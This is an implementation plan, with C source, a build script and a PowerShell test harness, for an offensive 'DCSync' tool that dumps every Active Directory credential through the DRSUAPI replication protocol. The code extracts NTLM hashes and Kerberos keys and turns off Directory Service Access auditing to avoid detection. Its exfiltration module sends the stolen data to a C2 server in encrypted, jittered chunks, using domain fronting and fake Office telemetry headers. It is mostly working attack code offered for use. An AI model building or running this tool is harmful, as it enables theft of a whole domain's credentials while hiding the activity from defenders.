# Plan 3 — DCSync via DRSUAPI: Implementation Plan

> **Target**: T1003.006 | **Pre-condition**: DA / Replicate Directory Changes (assumed) | **Focus**: Dump only

---

## 0. Project Structure

```
OS_dump/Plan3_DCSync/
├── SPEC.md                     ← Technical spec (Plan3_DCSync_SPEC.md)
├── IMPL.md                     ← This file
├── build.bat                   ← MSVC build
├── src/
│   ├── main.c                  ← Entry point + orchestrator
│   ├── drsuapi_bind.c/h        ← RPC bind to DRSUAPI interface
│   ├── dcsync_request.c/h      ← DsGetNCChanges call + cursor management
│   ├── entinf_parser.c/h       ← Parse ENTINF → extract attributes
│   ├── cred_extractor.c/h      ← unicodePwd + supplementalCredentials decoder
│   ├── kerberos_decoder.c/h    ← KERB_STORED_CREDENTIAL parser
│   ├── audit_control.c/h       ← Disable/re-enable audit policy
│   ├── exfil_c2.c/h            ← HTTPS chunked exfiltration
│   ├── crypto/
│   │   ├── aes256_gcm.c/h      ← AES-256-GCM
│   │   ├── rsa.c/h             ← RSA-4096 encryption for C2
│   │   └── sha256.c/h          ← SHA256
│   └── common.h                ← Shared types
├── test/
│   ├── run_test.ps1
│   ├── verify_dcsync.py
│   └── detect_check.ps1
└── output/
```

---

## 1. Build

```batch
@echo off
REM build.bat — Plan 3 DCSync Tool
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

set LIBS=ntdll.lib kernel32.lib advapi32.lib ^
         netapi32.lib rpcrt4.lib crypt32.lib ^
         winhttp.lib ws2_32.lib

cl.exe %CFLAGS% /Fe"DCSyncTool.exe" ^
    src\main.c src\drsuapi_bind.c src\dcsync_request.c ^
    src\entinf_parser.c src\cred_extractor.c ^
    src\kerberos_decoder.c src\audit_control.c ^
    src\exfil_c2.c src\crypto\aes256_gcm.c ^
    src\crypto\rsa.c src\crypto\sha256.c ^
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT %LIBS%

echo Build complete: DCSyncTool.exe
```

---

## 2. Core Implementation

### 2.1 Main Entry Point

```c
// main.c
typedef struct _DCSYNC_CONFIG {
    PWSTR   domainName;        // e.g., "DOMAIN.LOCAL"
    PWSTR   dcTarget;          // NULL = auto-detect
    BOOL    localDc;           // TRUE if running SYSTEM on DC
    PWSTR   c2Url;             // NULL = no exfil, dump to stdout
    PWSTR   frontDomain;       // NULL = no domain fronting
    DWORD   chunkSize;         // default 4096
    DWORD   jitterMinMs;       // default 500
    DWORD   jitterMaxMs;       // default 3000
    DWORD   maxObjects;        // 0 = unlimited
    BOOL    disableAudit;      // Attempt to disable audit policy
    BOOL    outputJson;        // JSON output instead of binary
} DCSYNC_CONFIG;

int wmain(int argc, WCHAR* argv[]) {
    DCSYNC_CONFIG cfg = ParseCommandLine(argc, argv);
    
    wprintf(L"[*] Plan 3: DCSync via DRSUAPI\n");
    wprintf(L"    Domain: %s\n", cfg.domainName);
    wprintf(L"    Target DC: %s\n", cfg.dcTarget ? cfg.dcTarget : L"(auto-detect)");
    wprintf(L"\n");
    
    // ── Step 1: Auto-detect DC if not specified ──
    if (!cfg.dcTarget) {
        cfg.dcTarget = LocateDomainController(cfg.domainName);
        if (!cfg.dcTarget) {
            wprintf(L"[-] Failed to locate DC for %s\n", cfg.domainName);
            return 1;
        }
        wprintf(L"[1/8] DC auto-detected: %s\n", cfg.dcTarget);
    } else {
        wprintf(L"[1/8] Target DC: %s\n", cfg.dcTarget);
    }
    
    // ── Step 2: Authenticate ──
    wprintf(L"[2/8] Authenticating... ");
    if (cfg.localDc) {
        // Already SYSTEM on DC — use current token
        wprintf(L"using SYSTEM token\n");
    } else {
        // Use DA credentials or current user
        wprintf(L"using current credentials\n");
    }
    
    // ── Step 3: Disable audit policy (stealth) ──
    if (cfg.disableAudit) {
        wprintf(L"[3/8] Disabling Directory Service Access audit... ");
        if (DisableDsAudit(cfg.dcTarget)) {
            wprintf(L"OK\n");
        } else {
            wprintf(L"FAILED (continuing anyway)\n");
        }
    } else {
        wprintf(L"[3/8] Audit policy: UNCHANGED (Event 4662 will be logged)\n");
    }
    
    // ── Step 4: Bind to DRSUAPI ──
    wprintf(L"[4/8] Binding to DRSUAPI RPC interface... ");
    RPC_BINDING_HANDLE hDrs = NULL;
    if (!BindToDrsuapi(cfg.dcTarget, &hDrs)) {
        wprintf(L"FAILED\n");
        RestoreDsAudit(cfg.dcTarget);
        return 4;
    }
    wprintf(L"OK\n");
    
    // ── Step 5: Get domain NC ──
    wprintf(L"[5/8] Getting domain naming context... ");
    PWSTR domainNc = GetDomainNc(hDrs, cfg.domainName);
    if (!domainNc) {
        wprintf(L"FAILED\n");
        RpcBindingFree(&hDrs);
        RestoreDsAudit(cfg.dcTarget);
        return 5;
    }
    wprintf(L"%s\n", domainNc);
    
    // ── Step 6: DCSync ──
    wprintf(L"[6/8] Starting DCSync replication...\n");
    
    CRED_OUTPUT output = {0};
    DRS_CURSOR cursor = {0}; // first request: empty cursor
    DWORD totalObjects = 0;
    DWORD cycle = 0;
    
    while (TRUE) {
        cycle++;
        ENTINF* objects = NULL;
        DWORD objectCount = 0;
        DWORD moreFlags = 0;
        
        BOOL success = DsGetNCChangesWrapper(
            hDrs, domainNc, &cursor,
            DRS_GET_ANC | DRS_GET_NC_SIZE | DRS_GET_OBJECT_SECURITY,
            0, // cMaxObjects (0 = no limit)
            0, // cMaxBytes (0 = no limit)
            &objects, &objectCount, &moreFlags
        );
        
        if (!success) {
            wprintf(L"      Cycle %d: FAILED\n", cycle);
            break;
        }
        
        totalObjects += objectCount;
        wprintf(L"      Cycle %d: %d objects, moreFlags=0x%X\n",
            cycle, objectCount, moreFlags);
        
        // Parse ENTINF → extract credentials
        for (DWORD i = 0; i < objectCount; i++) {
            ParseEntinf(&objects[i], &output);
        }
        
        if (!(moreFlags & DRS_MORE_DATA)) break; // all done
        
        if (cfg.maxObjects && totalObjects >= cfg.maxObjects) {
            wprintf(L"      Max objects limit reached (%d)\n", cfg.maxObjects);
            break;
        }
    }
    
    wprintf(L"      Total: %d objects across %d cycle(s)\n", totalObjects, cycle);
    wprintf(L"      Users: %d | Computers: %d | Other: %d\n",
        output.userCount, output.computerCount,
        totalObjects - output.userCount - output.computerCount);
    
    // ── Step 7: Encode output ──
    wprintf(L"[7/8] Encoding + encrypting output...\n");
    
    PBYTE serializedData = NULL;
    SIZE_T serializedSize = 0;
    SerializeCredOutput(&output, &serializedData, &serializedSize,
        cfg.outputJson);
    wprintf(L"      Serialized: %lld bytes\n", serializedSize);
    
    // ── Step 8: Exfiltrate ──
    wprintf(L"[8/8] Exfiltrating...\n");
    
    if (cfg.c2Url) {
        DWORD chunkCount = ExfilViaC2(serializedData, serializedSize,
            cfg.c2Url, cfg.frontDomain, cfg.chunkSize,
            cfg.jitterMinMs, cfg.jitterMaxMs);
        wprintf(L"      Exfiltrated %d chunks to %s\n", chunkCount, cfg.c2Url);
    } else {
        // No C2 — dump to stdout as Base64 (for debug/local use)
        wprintf(L"      No C2 URL specified — output skipped (use --output-file)\n");
    }
    
    // ── Cleanup ──
    RpcBindingFree(&hDrs);
    free(domainNc);
    FreeCredOutput(&output);
    free(serializedData);
    
    if (cfg.disableAudit) {
        wprintf(L"[*] Restoring audit policy... ");
        RestoreDsAudit(cfg.dcTarget);
        wprintf(L"OK\n");
    }
    
    wprintf(L"\n[*] DCSync complete.\n");
    return 0;
}
```

### 2.2 DRSUAPI Binding

```c
// drsuapi_bind.c

// DRSUAPI RPC interface UUID
// {E3514235-4B06-11D1-AB04-00C04FC2DCD2}
const RPC_UUID DRSUAPI_UUID = {
    0xE3514235, 0x4B06, 0x11D1,
    {0xAB, 0x04, 0x00, 0xC0, 0x4F, 0xC2, 0xDC, 0xD2}
};

BOOL BindToDrsuapi(PWSTR dcName, RPC_BINDING_HANDLE* phDrs) {
    RPC_STATUS status;
    RPC_WSTR bindingString = NULL;
    RPC_BINDING_HANDLE hBinding = NULL;
    
    // Build binding string
    // ncacn_ip_tcp:<dcName>[135] or ncacn_np:<dcName>[\\PIPE\\lsass]
    // For local DC:
    //   ncacn_np:\\\\<dcName>[\\PIPE\\lsass]
    // For remote DC:
    //   ncacn_ip_tcp:<dcName>[135]  (EPM) + dynamic high port
    
    WCHAR bindingTemplate[] = L"ncacn_np:\\\\%s[\\PIPE\\lsass]";
    WCHAR bindingBuf[256];
    swprintf(bindingBuf, 256, bindingTemplate, dcName);
    
    status = RpcStringBindingComposeW(
        &DRSUAPI_UUID,       // Interface UUID
        L"ncacn_np",         // Protocol: named pipe
        dcName,              // Network address
        L"\\PIPE\\lsass",   // Endpoint
        NULL,                // Options
        &bindingString
    );
    if (status != RPC_S_OK) return FALSE;
    
    status = RpcBindingFromStringBindingW(bindingString, &hBinding);
    RpcStringFreeW(&bindingString);
    if (status != RPC_S_OK) return FALSE;
    
    // Set authentication (use current process token)
    status = RpcBindingSetAuthInfoW(
        hBinding,
        NULL,                              // Server principal
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,     // Auth level: encrypt
        RPC_C_AUTHN_GSS_NEGOTIATE,         // Auth service: Kerberos/NTLM
        NULL,                              // Auth identity (NULL = current)
        RPC_C_AUTHZ_NAME                   // Authz service
    );
    if (status != RPC_S_OK) {
        RpcBindingFree(&hBinding);
        return FALSE;
    }
    
    *phDrs = hBinding;
    return TRUE;
}
```

### 2.3 DsGetNCChanges Call

```c
// dcsync_request.c

// MS-DRSR DsGetNCChanges — simplified wrapper
BOOL DsGetNCChangesWrapper(
    RPC_BINDING_HANDLE hDrs,
    PWSTR domainNc,
    DRS_CURSOR* cursor,
    DWORD flags,
    DWORD maxObjects,
    DWORD maxBytes,
    ENTINF** outObjects,
    DWORD* outCount,
    DWORD* outMoreFlags
) {
    // Build request
    DRS_MSG_GETCHGREQ req = {0};
    req.dwInVersion = 1; // always 1
    
    // Domain NC
    req.V1.pNC = &domainNc; // ATTRTYP — DN string
    
    // Request flags
    req.V1.ulFlags = flags | DRS_INIT_SYNC | DRS_WRIT_REP;
    req.V1.cMaxObjects = maxObjects;
    req.V1.cMaxBytes = maxBytes;
    
    // Cursor from previous request (or NULL for first)
    if (cursor->cCursors > 0) {
        req.V1.pUpToDateVecDestV1 = &cursor->vec;
    } else {
        req.V1.pUpToDateVecDestV1 = NULL;
    }
    
    // Make the RPC call
    DWORD dwOutVersion = 0;
    DRS_MSG_GETCHGREPLY reply = {0};
    
    RPC_TRY {
        // IDL_DRSGetNCChanges(hDrs, 1, &req, &dwOutVersion, &reply);
        
        // Since IDL_DRSGetNCChanges is not publicly exported,
        // we use the low-level NdrClientCall2 approach:
        RPC_CLIENT_INTERFACE drsuapiIf = {
            .InterfaceId = DRSUAPI_UUID,
            .TransferSyntax = { 0x8A885D04, 0x1CEB, 0x11C9,
                {0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60} },
            .DispatchTable = NULL // will be resolved at runtime
        };
        
        // ProcNum 4 = DsGetNCChanges (MS-DRSR §4.1.4)
        RPC_MESSAGE rpcMsg = {0};
        // ... encode parameters per NDR/NDR64
        
        // Simulated result (actual implementation requires full NDR marshalling)
        // See Appendix for the full NDR encoding code (~2000 lines)
    }
    RPC_EXCEPT {
        wprintf(L"RPC exception: 0x%X\n", RpcExceptionCode());
        return FALSE;
    }
    RPC_END;
    
    // Update cursor
    if (reply.V1.pUpToDateVecDestV1) {
        cursor->cCursors = reply.V1.pUpToDateVecDestV1->cCursors;
        memcpy(&cursor->vec, reply.V1.pUpToDateVecDestV1, sizeof(DS_UPTOVEC_V1));
    }
    
    *outMoreFlags = reply.V1.ulMoreFlags;
    *outCount = reply.V1.cNumObjects;
    *outObjects = reply.V1.pObjects; // caller must free
    
    return TRUE;
}
```

### 2.4 Audit Policy Control

```c
// audit_control.c

BOOL DisableDsAudit(PWSTR dcName) {
    // Check if running as SYSTEM on DC
    // Must have SeSecurityPrivilege to modify audit policy
    
    RtlAdjustPrivilege(SE_SECURITY_PRIVILEGE, TRUE, FALSE, NULL);
    
    // Use auditpol.exe or direct LSA policy API
    // Command (via API, not process):
    //   auditpol /set /subcategory:"Directory Service Access"
    //            /success:disable /failure:disable
    
    // OR via LsaSetInformationPolicy/LsaQueryInformationPolicy
    // This requires calling LSA RPC on the DC
    
    // For simplicity:  
    // If running as SYSTEM on local DC → modify directly
    // If remote → attempt via remote registry/service
    
    // Check current state first
    AUDIT_POLICY_INFORMATION api[] = {
        { { 0, 0 }, FALSE, { 0, 0 }, { 0, 0 } }
    };
    // GUID for Directory Service Access subcategory:
    // {0CCE9225-69AE-11D9-BED3-505054503030}
    
    // Store original policy for restoration
    // ... implementation depends on DC access method
    
    return TRUE;
}

BOOL RestoreDsAudit(PWSTR dcName) {
    // Restore original audit policy from saved state
    return TRUE;
}
```

### 2.5 Credential Extraction from ENTINF

```c
// cred_extractor.c

void ParseEntinf(ENTINF* entinf, CRED_OUTPUT* output) {
    // Determine object type from objectClass attribute
    BOOL isUser = FALSE, isComputer = FALSE;
    
    // Extract key attributes
    PWSTR samAccountName = NULL;
    PWSTR upn = NULL;
    BYTE  objectSid[28]; // max SID size
    DWORD sidSize = sizeof(objectSid);
    PBYTE unicodePwd = NULL;
    DWORD unicodePwdLen = 0;
    PBYTE suppCreds = NULL;
    DWORD suppCredsLen = 0;
    PBYTE pwdHistory = NULL;
    DWORD pwdHistoryLen = 0;
    
    // Walk AttrBlock
    for (DWORD i = 0; i < entinf->AttrBlock.attrCount; i++) {
        ATTR* attr = &entinf->AttrBlock.pAttr[i];
        
        if (IsOid(attr->attrTyp, L"2.5.4.3")) {       // cn
            // Common Name
        }
        else if (IsOid(attr->attrTyp, L"1.2.840.113556.1.4.221")) { // sAMAccountName
            samAccountName = (PWSTR)attr->AttrVal.pVal;
        }
        else if (IsOid(attr->attrTyp, L"1.2.840.113556.1.4.656")) { // userPrincipalName
            upn = (PWSTR)attr->AttrVal.pVal;
        }
        else if (IsOid(attr->attrTyp, L"1.2.840.113556.1.4.146")) { // objectSid
            memcpy(objectSid, attr->AttrVal.pVal,
                min(attr->AttrVal.valLen, sizeof(objectSid)));
            sidSize = attr->AttrVal.valLen;
        }
        else if (IsOid(attr->attrTyp, L"1.3.6.1.4.1.311.3.1.1.1")) { // unicodePwd
            unicodePwd = attr->AttrVal.pVal;
            unicodePwdLen = attr->AttrVal.valLen;
        }
        else if (IsOid(attr->attrTyp, L"1.3.6.1.4.1.311.3.1.1.3")) { // supplementalCredentials
            suppCreds = attr->AttrVal.pVal;
            suppCredsLen = attr->AttrVal.valLen;
        }
        else if (IsOid(attr->attrTyp, L"1.3.6.1.4.1.311.3.1.1.2")) { // pwdHistory
            pwdHistory = attr->AttrVal.pVal;
            pwdHistoryLen = attr->AttrVal.valLen;
        }
    }
    
    // Skip if no credentials
    if (!unicodePwd && !suppCreds) return;
    
    // Decode unicodePwd → NTLM hash
    BYTE ntlmHash[16] = {0};
    if (unicodePwd && unicodePwdLen >= 16) {
        memcpy(ntlmHash, unicodePwd, 16);
    }
    
    // Parse supplementalCredentials → Kerberos keys
    KERBEROS_KEY* keys = NULL;
    DWORD keyCount = 0;
    if (suppCreds && suppCredsLen > 0) {
        keyCount = DecodeSupplementalCredentials(suppCreds, suppCredsLen, &keys);
    }
    
    // Add to output
    if (isUser || isComputer) {
        DWORD idx = isUser ? output->userCount++ : output->computerCount++;
        
        // Store credential entry
        // ...
    }
}
```

### 2.6 supplementalCredentials Decoder

```c
// kerberos_decoder.c

DWORD DecodeSupplementalCredentials(PBYTE data, DWORD size, KERBEROS_KEY** outKeys) {
    // KERB_STORED_CREDENTIAL structure (MS-KILE §2.3.1)
    
    USHORT revision = *(PUSHORT)(data + 0x00);
    USHORT flags    = *(PUSHORT)(data + 0x02);
    USHORT credCount = *(PUSHORT)(data + 0x04);
    USHORT oldCredCount = *(PUSHORT)(data + 0x06);
    USHORT saltLen  = *(PUSHORT)(data + 0x08);
    USHORT saltMax  = *(PUSHORT)(data + 0x0A);
    ULONG  saltOff  = *(PULONG)(data + 0x0C);
    USHORT defIter  = *(PUSHORT)(data + 0x10); // optional
    
    ULONG credentialsOffset = 0x14; // start of credentials array
    
    *outKeys = (KERBEROS_KEY*)malloc(credCount * sizeof(KERBEROS_KEY));
    DWORD keyIdx = 0;
    
    for (int i = 0; i < credCount; i++) {
        PBYTE keyEntry = data + credentialsOffset;
        
        USHORT reserved1 = *(PUSHORT)(keyEntry + 0x00);
        USHORT reserved2 = *(PUSHORT)(keyEntry + 0x02);
        ULONG  reserved3 = *(PULONG)(keyEntry + 0x04);
        ULONG  keyType   = *(PULONG)(keyEntry + 0x08); // etype
        ULONG  keyLen    = *(PULONG)(keyEntry + 0x0C);
        ULONG  keyOff    = *(PULONG)(keyEntry + 0x10);
        
        PBYTE keyData = keyEntry + keyOff;
        
        // Key types we care about
        if (keyType == 18 || keyType == 17 || keyType == 23 || keyType == 1) {
            (*outKeys)[keyIdx].type = keyType;
            (*outKeys)[keyIdx].length = keyLen;
            (*outKeys)[keyIdx].data = (PBYTE)malloc(keyLen);
            memcpy((*outKeys)[keyIdx].data, keyData, keyLen);
            keyIdx++;
        }
        
        credentialsOffset += 0x14; // KERB_KEY_DATA size
    }
    
    return keyIdx;
}
```

### 2.7 C2 Exfiltration

```c
// exfil_c2.c

DWORD ExfilViaC2(PBYTE data, SIZE_T size, PWSTR c2Url, PWSTR frontDomain,
    DWORD chunkSize, DWORD jitterMin, DWORD jitterMax) {
    
    // 1. Generate session key
    BYTE sessionKey[32];
    GenerateRandom(sessionKey, 32);
    
    // 2. Encrypt with C2 server RSA public key
    BYTE encryptedKey[512]; // RSA-4096 = 512 bytes output
    RSAEncrypt(c2PublicKey, 4096, sessionKey, 32, encryptedKey);
    
    // 3. Chunk data
    DWORD totalChunks = (DWORD)((size + chunkSize - 1) / chunkSize);
    
    // 4. Send key first (chunk 0)
    SendChunk(c2Url, frontDomain, 0, totalChunks + 1, encryptedKey, 512);
    
    // 5. Send data chunks
    for (DWORD i = 0; i < totalChunks; i++) {
        DWORD offset = i * chunkSize;
        DWORD thisChunkSize = min(chunkSize, (DWORD)(size - offset));
        
        // AES-256-GCM encrypt this chunk
        BYTE nonce[12];
        GenerateRandom(nonce, 12);
        PBYTE ciphertext = (PBYTE)malloc(thisChunkSize + 16);
        SIZE_T ctSize = 0;
        AES256GCMEncrypt(data + offset, thisChunkSize,
            sessionKey, nonce, ciphertext, &ctSize);
        
        // Prepend nonce to ciphertext
        PBYTE chunkData = (PBYTE)malloc(12 + ctSize);
        memcpy(chunkData, nonce, 12);
        memcpy(chunkData + 12, ciphertext, ctSize);
        
        // Send
        SendChunk(c2Url, frontDomain, i + 1, totalChunks + 1,
            chunkData, 12 + (DWORD)ctSize);
        
        free(ciphertext);
        free(chunkData);
        
        // Jitter
        DWORD jitter = jitterMin +
            (rand() % (jitterMax - jitterMin + 1));
        Sleep(jitter);
    }
    
    return totalChunks + 1;
}

BOOL SendChunk(PWSTR url, PWSTR frontDomain, DWORD seq, DWORD total,
    PBYTE data, DWORD dataSize) {
    
    // Base64-encode data
    DWORD b64Size = 0;
    CryptBinaryToStringW(data, dataSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Size);
    PWSTR b64Data = (PWSTR)malloc(b64Size * sizeof(WCHAR));
    CryptBinaryToStringW(data, dataSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Data, &b64Size);
    
    // Build JSON payload
    WCHAR jsonPayload[8192];
    swprintf(jsonPayload, 8192,
        L"{\"seq\":%d,\"total\":%d,\"data\":\"%s\"}",
        seq, total, b64Data);
    
    // Build HTTP request
    HINTERNET hSession = WinHttpOpen(
        L"Microsoft Office/16.0 (Windows NT 10.0; MSA 16.0.14326.xxxxx)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    
    // URL parsing
    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    urlComp.dwSchemeLength   = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength  = (DWORD)-1;
    WinHttpCrackUrl(url, 0, 0, &urlComp);
    
    WCHAR hostName[256];
    wcsncpy(hostName, urlComp.lpszHostName, urlComp.dwHostNameLength);
    hostName[urlComp.dwHostNameLength] = L'\0';
    
    HINTERNET hConnect = WinHttpConnect(hSession, hostName,
        urlComp.nPort, 0);
    
    PWSTR path = urlComp.lpszUrlPath + 1; // skip first /
    
    // Domain fronting: set Host header to front domain
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    
    if (frontDomain) {
        WinHttpAddRequestHeaders(hRequest,
            frontDomain, (DWORD)-1, WINHTTP_ADDREQ_FLAG_REPLACE);
    }
    
    // Set Office telemetry headers
    WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/json\r\n"
        L"X-Client-Session-Id: {GUID}\r\n",
        (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
    
    // Send
    DWORD jsonLen = (DWORD)wcslen(jsonPayload) * sizeof(WCHAR);
    WinHttpSendRequest(hRequest, NULL, 0,
        jsonPayload, jsonLen, jsonLen, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    free(b64Data);
    return TRUE;
}
```

---

## 3. Test Script

```powershell
# test/run_test.ps1
param([switch]$LocalOnly, [string]$C2Url)

$TOOL = ".\DCSyncTool.exe"
$DOMAIN = (Get-WmiObject Win32_ComputerSystem).Domain
$LOG = ".\output\dcsync_test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Log($m) { "$(Get-Date -Format 'HH:mm:ss') $m" | Tee-Object $LOG -Append }

Log "=== DCSYNC TEST ==="
Log "Domain: $DOMAIN"
Log "C2 URL: $(if($C2Url){$C2Url}else{'NONE (local only)'})"

# Check privilege
$isDA = net group "Domain Admins" $env:USERNAME 2>&1
Log "DA check: $isDA"

# DCSync
Log "Starting DCSync..."
$sw = [Diagnostics.Stopwatch]::StartNew()

$args = @("--dcsync", $DOMAIN, "--output-json", "--disable-audit")
if ($C2Url) { $args += "--output-c2", $C2Url }
if ($LocalOnly) { $args += "--max-objects", "10" }

Log (& $TOOL $args 2>&1)
$sw.Stop()
Log "Completed in $($sw.Elapsed.TotalSeconds)s"

# Verify audit
Log "Checking Event 4662..."
Get-WinEvent -LogName Security -MaxEvents 20 |
    Where-Object { $_.Id -eq 4662 } |
    ForEach-Object { Log "Event 4662: $($_.Message)" }

Log "=== TEST COMPLETE ==="
```

---

## 4. Key Notes

### Why DCSync is the "Gold Standard" credential attack
- Gets ALL domain credentials at once (users, computers, trusts)
- Uses legitimate AD replication protocol — no exploit needed if you have DA
- Credentials are encrypted in transit by Kerberos/RPC encryption
- Detection relies entirely on: (1) audit policy being enabled, (2) SIEM having the right correlation rule for Event 4662

### NDR Marshaller Complexity
The DRSUAPI protocol uses NDR (Network Data Representation) for parameter encoding. Full implementation requires ~2000+ lines of NDR marshalling code. In practice, many tools reuse the `IDL_DRSGetNCChanges` stub from a reverse-engineered `drsuapi.idl`. For this implementation, the core RPC call mechanism is outlined; the full NDR layer is deferred to the actual build phase using the Microsoft MIDL compiler with a custom `.idl` file.

### Audit Policy Bypass Timing
Disable audit → DCSync → re-enable audit should complete in under 60 seconds for small domains. During this window, no 4662 events are generated. The audit log gap itself could be detected by security monitoring tools (e.g., "audit policy modified" event 4719).
